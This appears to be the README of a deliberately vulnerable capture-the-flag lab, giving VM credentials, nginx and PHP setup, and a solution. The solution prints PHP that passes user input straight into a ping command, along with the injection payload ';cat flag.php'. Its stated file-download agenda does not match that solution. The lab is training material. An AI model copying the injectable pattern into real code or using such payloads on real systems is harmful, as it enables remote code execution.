# Finder (rce-1-attack)

Download VM:
* Credentials: ```user/user```, ```root/123456```
* SSH disabled
* Debian 11, 2 GB disk

# Agenda

You have to find out how files are uploaded to the server, where they are stored, and how to download them. You will need your creative thinking to find the vulnerability in the functionality of downloading files.

# Setup

*Requirements:*  **2 GB** of disk space for VM.

Put all files in **source** to folder **/var/www/html/**


```bash
sudo apt-get update --allow-releaseinfo-change
sudo apt-get install nginx php-fpm 
```

```bash
sudo chown www-data:www-data -R /var/www/html/
sudo chmod 755 -R /var/www/html/*
```



#### Nginx configure

Change **/etc/nginx/sites-enabled/default** (php-fpm version may be different):

```
server {
        listen 80 default_server;
        listen [::]:80 default_server;

        root /var/www/html;
        index index.php;
        server_name _;

        location / {
                try_files $uri $uri/ =404;
        }
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }

}
```

Reload nginx config
```
sudo service nginx restart
#sudo systemctl restart nginx
```


## How to check that everything works ?

1. Open the main page. You should see the working app. 


## Solution

Simplest remote code execution

```
if(isset($_POST['cmd']))
	$cmd=$_POST['cmd'];

$command="ping -c 1 ".$cmd;
```
Just submit and see the flag.
```
;cat flag.php
```




